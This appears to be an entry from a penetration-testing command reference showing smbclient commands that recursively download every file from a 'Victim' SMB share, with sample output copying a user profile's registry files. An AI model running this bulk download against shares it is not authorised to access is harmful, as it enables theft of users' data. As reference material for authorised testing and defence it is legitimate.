---
id: c4d12e5a-1cca-4a2c-94ca-4bd5f2afcd9c
name: smbclient Download All Files Recursively From SMB
type: command
executor: bash
data: 'smb: \Victim\> RECURSE ON

  smb: \Victim\> PROMPT OFF

  smb: \Victim\> mget *'
output: "smb: \\Bob\\> RECURSE ON                                            \nsmb:\
  \ \\Bob\\> PROMPT OFF                                              \nsmb: \\Bob\\\
  > mget *                                                  \nNT_STATUS_SHARING_VIOLATION\
  \ opening remote file \\Bob\\NTUSER.DAT     \nNT_STATUS_SHARING_VIOLATION opening\
  \ remote file \\Bob\\ntuser.dat.LOG1\nNT_STATUS_SHARING_VIOLATION opening remote\
  \ file \\Bob\\ntuser.dat.LOG2\ngetting file \\Bob\\NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TM.blf\
  \ of size 65536 as NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TM.blf (7999.9\
  \ KiloBytes/sec) (average 8000.0 KiloBytes/sec)\ngetting file \\Bob\\NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000001.regtrans-ms\
  \ of size 524288 as NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000001.regtrans-ms\
  \ (25599.9 KiloBytes/sec) (average 20571.4 KiloBytes/sec)\ngetting file \\Bob\\\
  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000002.regtrans-ms\
  \ of size 524288 as NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000002.regtrans-ms\
  \ (51199.5 KiloBytes/sec) (average 28631.6 KiloBytes/sec)\ngetting file \\Bob\\\
  ntuser.ini of size 20 as ntuser.ini (9.8 KiloBytes/sec) (average 27200.5 KiloBytes/sec)"
created_at: '2019-09-18T01:44:02.128880+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# smbclient Download All Files Recursively From SMB

```bash
smb: \Victim\> RECURSE ON
smb: \Victim\> PROMPT OFF
smb: \Victim\> mget *
```

## Expected Output

```
smb: \Bob\> RECURSE ON                                            
smb: \Bob\> PROMPT OFF                                              
smb: \Bob\> mget *                                                  
NT_STATUS_SHARING_VIOLATION opening remote file \Bob\NTUSER.DAT     
NT_STATUS_SHARING_VIOLATION opening remote file \Bob\ntuser.dat.LOG1
NT_STATUS_SHARING_VIOLATION opening remote file \Bob\ntuser.dat.LOG2
getting file \Bob\NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TM.blf of size 65536 as NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TM.blf (7999.9 KiloBytes/sec) (average 8000.0 KiloBytes/sec)
getting file \Bob\NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000001.regtrans-ms of size 524288 as NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000001.regtrans-ms (25599.9 KiloBytes/sec) (average 20571.4 KiloBytes/sec)
getting file \Bob\NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000002.regtrans-ms of size 524288 as NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000002.regtrans-ms (51199.5 KiloBytes/sec) (average 28631.6 KiloBytes/sec)
getting file \Bob\ntuser.ini of size 20 as ntuser.ini (9.8 KiloBytes/sec) (average 27200.5 KiloBytes/sec)
```
